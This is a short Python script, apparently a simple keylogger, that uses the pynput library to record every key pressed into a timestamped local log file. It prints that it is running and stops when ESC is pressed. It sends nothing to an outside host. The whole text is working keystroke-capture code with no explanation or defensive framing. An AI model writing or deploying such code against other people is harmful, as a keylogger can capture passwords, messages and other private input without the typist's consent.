from datetime import datetime
import logging
from pynput import keyboard

current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
log_filename = f"key_log_{current_time}.txt"

logging.basicConfig(
    filename=log_filename,
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"    
)

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        print(f"\nStopping keylogger... Logs saved to {log_filename}")
        return False
        
print("Keylogger is running locally... Press 'ESC' to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

